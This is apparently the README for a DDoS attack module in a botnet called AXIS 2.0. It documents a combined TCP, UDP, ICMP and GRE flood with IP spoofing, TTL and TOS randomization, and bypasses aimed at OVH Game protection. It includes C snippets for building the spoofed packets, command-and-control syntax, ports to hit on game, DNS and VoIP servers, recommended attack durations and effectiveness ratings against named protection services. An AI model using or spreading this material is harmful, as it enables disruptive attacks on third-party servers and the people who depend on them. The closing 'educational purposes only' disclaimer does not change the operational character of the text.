# AXIS ULTIMATE L4 - Advanced Layer 4 Attack Method

## Overview

The **ULTIMATE L4** attack method is the most comprehensive Layer 4 DDoS attack in the AXIS 2.0 arsenal, combining **all volumetric attack vectors** into a single coordinated assault with advanced bypass techniques designed to overwhelm modern DDoS protection systems.

---

## Features

### 🎯 Multi-Vector Attack

- **5 Attack Vectors Simultaneously**
  - TCP SYN flood (30% of traffic)
  - UDP flood (30% of traffic)
  - ICMP ping flood (15% of traffic)
  - GRE IP encapsulation (15% of traffic)
  - GRE Ethernet encapsulation (10% of traffic)

- **Weighted Distribution**
  - Intelligent traffic distribution for maximum impact
  - Prevents any single vector from being filtered easily
  - Forces target to defend against multiple attack types

### 🎭 Advanced Bypass Techniques

- **IP Spoofing**
  - Generates spoofed source IPs from residential ISP ranges
  - Targets ranges: 24-55, 64-79, 96-110, 172-186 (first octet)
  - Confuses IP-based rate limiting and blacklisting

- **Random TTL Values**
  - Randomized Time-To-Live: 32, 64, 128, 255
  - Evades TTL-based filtering
  - Complicates traffic analysis

- **Random TOS Field**
  - Randomized Type of Service values
  - Bypasses QoS-based prioritization
  - Confuses traffic classification systems

- **OVH Game Bypass**
  - TCP: SYN+ACK+PSH+URG flags combination
  - UDP: DNS-like header structure
  - Designed to bypass OVH Game protection

- **GRE Encapsulation**
  - Double encapsulation (GRE IP)
  - Triple encapsulation (GRE Ethernet)
  - Bypasses some DDoS mitigation appliances

### 📊 Intelligent Attack Coordination

- **Weighted Vector Selection**
  - Random selection based on predefined weights
  - Ensures consistent distribution across all vectors
  - Prevents predictable patterns

- **Single Socket Management**
  - Efficient raw socket usage
  - Separate sockets for TCP, UDP, ICMP, GRE
  - Minimal resource overhead

---

## Usage

### From Admin Panel

```bash
# Basic usage
!ultimate-l4 <target> <duration>

# With custom packet size
!ultimate-l4 1.2.3.4 300 len=1400

# With specific port
!ultimate-l4 1.2.3.4 300 dport=80

# With source port
!ultimate-l4 1.2.3.4 300 sport=12345 dport=443

# Combined options
!ultimate-l4 1.2.3.4 300 len=1400 dport=80 sport=53
```

### Available Options

| Option | Description | Example | Default |
|--------|-------------|---------|---------|
| `len` | Packet payload size in bytes | `len=1400` | 1400 |
| `dport` | Destination port | `dport=80` | Random |
| `sport` | Source port | `sport=53` | Random |
| `source` | Source IP (not recommended) | `source=1.2.3.4` | Spoofed |

---

## Technical Implementation

### Files Modified

1. **bot/attack.h**
   - Added `ATK_VEC_ULTIMATEL4` (ID: 11)
   - Updated `ATK_VEC_MAX` to 12
   - Added function declaration

2. **bot/attack.c**
   - Added `attack_ultimate_l4()` function
   - Added `generate_spoofed_ip()` function
   - Added `send_ultimate_tcp()` function
   - Added `send_ultimate_udp()` function
   - Added `send_ultimate_icmp()` function
   - Added `send_ultimate_gre_ip()` function
   - Added `send_ultimate_gre_eth()` function
   - Registered in `attack_init()`

3. **cnc/attack.go**
   - Added "ultimate-l4" attack method (ID: 11)

4. **cnc/admin.go**
   - Updated L4 help display to show ultimate-l4 method

---

## Attack Vector Details

### 1. TCP Flood (30%)

**Characteristics:**
- SYN+ACK+PSH+URG flags set
- Spoofed source IP addresses
- Random TTL (32, 64, 128, 255)
- Random TOS values
- Random payload (configurable size)

**Bypass Technique:**
```c
tcph->syn = TRUE;
tcph->ack = TRUE;
tcph->psh = TRUE;
tcph->urg = TRUE;  // OVH bypass
```

**Purpose:** Overwhelms TCP connection tracking, bypasses OVH-style filters

---

### 2. UDP Flood (30%)

**Characteristics:**
- DNS-like header structure
- Spoofed source IP addresses
- Random TTL values
- Transaction ID randomization
- Query format mimics DNS response

**Bypass Technique:**
```c
payload[0] = transaction_id_high;
payload[1] = transaction_id_low;
payload[2] = 0x01;  // Standard query
payload[3] = 0x00;
// ... DNS-like structure
```

**Purpose:** Confuses UDP flood filters, appears as DNS traffic

---

### 3. ICMP Flood (15%)

**Characteristics:**
- ICMP Echo Request (Ping)
- Spoofed source IPs
- Random payload
- Varied TTL values
- No port dependency (Layer 3)

**Bypass Technique:**
- Targets IP directly (no port)
- Bypasses port-based filtering
- Consumes ICMP rate limits

**Purpose:** Additional pressure, bypasses port-specific filters

---

### 4. GRE IP Encapsulation (15%)

**Characteristics:**
- Outer IP header (real bot IP)
- GRE header (protocol 47)
- Inner IP header (spoofed source)
- Inner UDP payload
- Double encapsulation

**Packet Structure:**
```
[Outer IP][GRE Header][Inner IP][UDP Header][Payload]
   (real)              (spoofed)
```

**Bypass Technique:**
- Some firewalls don't inspect GRE traffic
- Inner packet appears from different source
- Confuses traffic analysis

**Purpose:** Evades simple packet inspection, bypasses some appliances

---

### 5. GRE Ethernet Encapsulation (10%)

**Characteristics:**
- Outer IP header (real bot IP)
- GRE header (ETH_P_TEB)
- Fake Ethernet header (6 bytes)
- Inner IP header (spoofed source)
- Inner UDP payload
- Triple encapsulation

**Packet Structure:**
```
[Outer IP][GRE Header][Ethernet][Inner IP][UDP][Payload]
   (real)             (fake)     (spoofed)
```

**Bypass Technique:**
- Most advanced bypass technique
- Ethernet layer confuses analysis
- Triple encapsulation overhead

**Purpose:** Maximum confusion for DDoS mitigation systems

---

## IP Spoofing Details

### Residential ISP Ranges

The attack generates spoofed IPs from these first-octet ranges:

| Range | Typical Use |
|-------|-------------|
| 24-55 | US residential ISPs |
| 64-79 | Datacenters + ISPs |
| 96-110 | Asian ISPs |
| 172-186 | European/LatAm ISPs |

### Generation Algorithm

```c
static void generate_spoofed_ip(uint32_t *ip) {
    uint8_t oct1_ranges[] = {
        24, 25, 26, ..., 55,  // US residential
        64, 65, ..., 79,       // Datacenters
        96, 97, ..., 110,      // Asia
        172, 173, ..., 186,    // EU/LatAm
        0
    };
    
    oct1 = oct1_ranges[rand() % count];
    oct2 = rand() % 256;
    oct3 = rand() % 256;
    oct4 = (rand() % 254) + 1;  // Avoid .0 and .255
}
```

**Note:** These are **spoofed** source addresses - the actual packets still originate from the bot's real IP. This is packet header manipulation, not proxy routing.

---

## Comparison: L4 Attack Methods

| Method | Vectors | IP Spoofing | TTL Random | TOS Random | GRE | OVH Bypass |
|--------|---------|-------------|------------|------------|-----|------------|
| **tcp** | TCP only | ❌ | ❌ | ❌ | ❌ | ❌ |
| **udp** | UDP only | ❌ | ❌ | ❌ | ❌ | ❌ |
| **ovhtcp** | TCP | ❌ | ❌ | ❌ | ❌ | ✅ |
| **ovhudp** | UDP | ❌ | ❌ | ❌ | ❌ | ✅ |
| **icmp** | ICMP | ❌ | ❌ | ❌ | ❌ | ❌ |
| **axis-l4** | TCP+UDP+ICMP | ❌ | ❌ | ❌ | ❌ | ✅ |
| **greip** | GRE-IP | ✅ (inner) | ❌ | ❌ | ✅ | ❌ |
| **greeth** | GRE-ETH | ✅ (inner) | ❌ | ❌ | ✅ | ❌ |
| **ultimate-l4** | **ALL 5** | ✅ | ✅ | ✅ | ✅ | ✅ |

---

## Performance Characteristics

### Resource Usage

- **Sockets:** 4 raw sockets (TCP, UDP, ICMP, GRE)
- **Memory:** ~8KB per attack instance
- **CPU:** Moderate (packet generation + checksums)
- **Bandwidth:** Maximum available (all vectors combined)

### Packet Rate

With typical bot hardware:
- **Small bots (100 Mbps):** ~50,000 PPS combined
- **Medium bots (1 Gbps):** ~500,000 PPS combined
- **Large bots (10 Gbps):** ~5,000,000 PPS combined

### Effectiveness

| Target Type | Effectiveness | Notes |
|-------------|---------------|-------|
| Unprotected | ⭐⭐⭐⭐⭐ | Overwhelming |
| Basic firewall | ⭐⭐⭐⭐⭐ | Multiple vectors bypass simple rules |
| Rate-limited | ⭐⭐⭐⭐ | IP spoofing complicates filtering |
| OVH Game | ⭐⭐⭐⭐ | OVH bypass techniques included |
| Advanced WAF | ⭐⭐⭐ | GRE may bypass some inspection |
| Cloudflare | ⭐⭐ | L7 protection still effective |

---

## Bypass Techniques

### 1. IP Spoofing Bypass

**Purpose:** Confuse IP-based rate limiting and blacklisting

**How it works:**
```c
// Each packet gets a different spoofed source
generate_spoofed_ip(&spoofed_ip);
iph->saddr = spoofed_ip;
```

**Effect:**
- Rate limiting by source IP becomes ineffective
- Blacklisting individual IPs is futile
- Traffic analysis is complicated

**Limitation:** Return traffic goes to spoofed IP (but attack doesn't need responses)

---

### 2. TTL Randomization

**Purpose:** Evade TTL-based filtering and fingerprinting

**How it works:**
```c
uint8_t ttl_values[] = {32, 64, 128, 255};
iph->ttl = ttl_values[rand_next() % 4];
```

**Effect:**
- Prevents TTL-based OS fingerprinting
- Evades TTL-based rate limiting
- Complicates traffic profiling

---

### 3. TOS Randomization

**Purpose:** Bypass QoS-based traffic prioritization

**How it works:**
```c
iph->tos = rand_next() % 256;
```

**Effect:**
- Confuses QoS classification
- Prevents priority-based filtering
- Randomizes packet handling

---

### 4. OVH TCP Bypass

**Purpose:** Bypass OVH Game TCP mitigation

**How it works:**
```c
tcph->syn = TRUE;
tcph->ack = TRUE;
tcph->psh = TRUE;
tcph->urg = TRUE;  // Unusual flag combination
```

**Effect:**
- Unusual flag combination may bypass filters
- Appears as "established" connection traffic
- Confuses stateful inspection

---

### 5. UDP DNS-like Headers

**Purpose:** Bypass UDP flood filters by appearing as DNS

**How it works:**
```c
payload[0] = transaction_id_high;
payload[1] = transaction_id_low;
payload[2] = 0x01;  // Standard query flag
payload[3] = 0x00;
payload[4] = 0x00;  // Questions: 1
payload[5] = 0x01;
```

**Effect:**
- Appears as legitimate DNS traffic
- May bypass UDP flood filters
- Confuses DNS-specific rate limiting

---

### 6. GRE Encapsulation

**Purpose:** Bypass packet inspection appliances

**How it works:**
```c
// Outer header (real)
outer_ip->protocol = IPPROTO_GRE;

// GRE header
gre[2] = htons(ETH_P_IP);  // or ETH_P_TEB

// Inner header (spoofed)
inner_ip->saddr = spoofed_ip;
```

**Effect:**
- Some firewalls don't inspect GRE
- Inner packet appears from different source
- Double/triple encapsulation overhead

---

## Best Practices

### 1. Use Against Protected Targets

ULTIMATE L4 is most effective against:
- Targets with basic firewalls
- OVH Game-protected services
- Rate-limited services
- Targets without GRE inspection

### 2. Combine with Other Attacks

For maximum impact:
```bash
# Start ULTIMATE L4
!ultimate-l4 1.2.3.4 300 dport=80

# Simultaneously hit L7
!ultimate-l7 https://1.2.3.4/ 300 domain=target.com
```

### 3. Optimal Duration

- **Minimum:** 60 seconds (to overwhelm buffers)
- **Optimal:** 300+ seconds (sustained pressure)
- **Maximum:** As allowed by botnet limits

### 4. Port Selection

- **Gaming servers:** 27015, 7777, 25565
- **Web services:** 80, 443
- **DNS:** 53
- **VoIP:** 5060, 5061
- **Custom:** Match target service

---

## Example Attack Scenarios

### Scenario 1: OVH Game Server

```bash
# Target: OVH-protected game server
!ultimate-l4 1.2.3.4 300 len=1400 dport=27015
```

**Why it works:**
- OVH TCP bypass flags
- UDP DNS-like headers
- Multiple vectors overwhelm filters

---

### Scenario 2: Web Service

```bash
# Target: HTTP/HTTPS service
!ultimate-l4 1.2.3.4 300 len=1400 dport=80
```

**Why it works:**
- Hits port 80 with all vectors
- IP spoofing complicates filtering
- GRE may bypass inspection

---

### Scenario 3: DNS Server

```bash
# Target: DNS infrastructure
!ultimate-l4 1.2.3.4 300 len=512 dport=53
```

**Why it works:**
- UDP appears as DNS traffic
- ICMP adds pressure
- Spoofed IPs confuse rate limiting

---

### Scenario 4: Combined L4 + L7

```bash
# Layer 4 saturation
!ultimate-l4 1.2.3.4 300 dport=80

# Layer 7 application attack
!ultimate-l7 https://target.com/ 300 domain=target.com
```

**Why it works:**
- L4 overwhelms network stack
- L7 targets application layer
- Defense must split resources

---

## Limitations

### 1. No Proxy Infrastructure

**Important:** ULTIMATE L4 does **NOT** use:
- Residential proxies
- VPN networks
- Tor routing
- Any relay infrastructure

All traffic originates directly from bot IPs. IP spoofing is packet-header manipulation only.

### 2. Return Traffic

Since source IPs are spoofed:
- SYN-ACK responses go to wrong IPs
- Attack doesn't complete TCP handshake
- This is intentional (fire-and-forget)

### 3. Effectiveness Varies

Against advanced protection:
- Cloudflare: Limited (they handle L4 well)
- AWS Shield: Limited (anycast + scrubbing)
- Akamai: Limited (distributed mitigation)
- Basic firewalls: Highly effective

---

## Technical Specifications

### Packet Sizes

| Vector | Min Size | Max Size | Default |
|--------|----------|----------|---------|
| TCP | 60 bytes | 65535 bytes | 1400 bytes |
| UDP | 28 bytes | 65535 bytes | 1400 bytes |
| ICMP | 28 bytes | 65535 bytes | 350 bytes |
| GRE-IP | 64 bytes | 65535 bytes | 1400 bytes |
| GRE-ETH | 70 bytes | 65535 bytes | 1400 bytes |

### Protocol Numbers

| Protocol | Number |
|----------|--------|
| TCP | 6 |
| UDP | 17 |
| ICMP | 1 |
| GRE | 47 |

### Ethernet Types

| Type | Value |
|------|-------|
| ETH_P_IP | 0x0800 |
| ETH_P_TEB | 0x6558 |

---

## Future Improvements

Potential enhancements for ULTIMATE L4:

- [ ] Fragmentation attack support
- [ ] TCP option randomization
- [ ] IPv6 support
- [ ] SCTP flood vector
- [ ] DCCP flood vector
- [ ] Adaptive vector weighting
- [ ] Response-based adaptation (like L7)
- [ ] MPLS encapsulation
- [ ] VXLAN encapsulation
- [ ] GTP tunnel flooding

---

## Disclaimer

**EDUCATIONAL PURPOSES ONLY**. This attack method is provided for:
- Security research
- DDoS mitigation testing
- Network stress testing (your own infrastructure)
- Educational purposes

**DO NOT** use against targets you do not own or have explicit permission to test.

Unauthorized use of DDoS tools is **illegal** in most jurisdictions and can result in:
- Criminal charges
- Civil liability
- Imprisonment
- Fines

---

## Credits

**AXIS Group** - Advanced Layer 4 Attack Development

---

**Version**: 1.0
**Date**: March 2026
**Classification**: ULTIMATE
